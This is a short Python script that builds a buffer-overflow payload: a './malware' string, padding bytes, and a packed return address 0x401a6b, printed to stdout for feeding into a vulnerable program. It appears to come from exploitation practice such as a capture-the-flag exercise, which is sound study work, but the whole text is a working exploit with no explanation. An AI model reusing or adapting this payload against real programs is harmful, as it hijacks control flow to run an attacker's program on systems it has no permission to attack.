import sys
from struct import pack

payload  = b"./malware\x00"
payload += b"A" * 6
payload += b"B" * 8
payload += pack("<Q", 0x401a6b)

sys.stdout.buffer.write(payload + b"\n")
